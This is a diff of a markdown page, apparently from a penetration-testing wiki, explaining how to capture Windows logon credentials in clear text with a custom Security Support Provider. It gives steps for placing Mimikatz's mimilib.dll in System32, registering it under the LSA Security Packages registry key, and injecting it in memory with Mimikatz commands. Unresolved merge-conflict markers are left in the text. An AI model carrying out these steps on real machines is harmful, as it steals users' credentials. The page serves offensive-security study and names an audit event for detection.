@@ -2,13 +2,18 @@
 
 ## Custom SSP
 
-[Learn what is a SSP \(Security Support Provider\) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)  
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
+You can create you **own SSP **to **capture** in **clear text **the **credentials **used to access the machine.
 
 #### Mimilib
 
+<<<<<<< HEAD
 You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**  
 Drop the dll in _\*\*_`C:\Windows\System32\`  
+=======
+You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
+****Drop the dll in** **`C:\Windows\System32\`\
+>>>>>>> 72cbd88461ed0e65da5433596050dd2ecb643f6b
 Get a list existing LSA Security Packages:
 
 {% code title="attacker@target" %}
@@ -20,7 +25,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 ```
 {% endcode %}
 
-Add `mimilib.dll` to the Security Support Provider list \(Security Packages\):
+Add `mimilib.dll` to the Security Support Provider list (Security Packages):
 
 ```csharp
 PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
@@ -30,7 +35,7 @@ And after a reboot all credentials can be found in clear text in `C:\Windows\Sys
 
 #### In memory
 
-You can also inject this in memory directly using Mimikatz \(notice that it could be a little bit unstable/not working\):
+You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
 
 ```csharp
 privilege::debug
@@ -42,4 +47,3 @@ This won't survive reboots.
 ### Mitigation
 
 Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
-
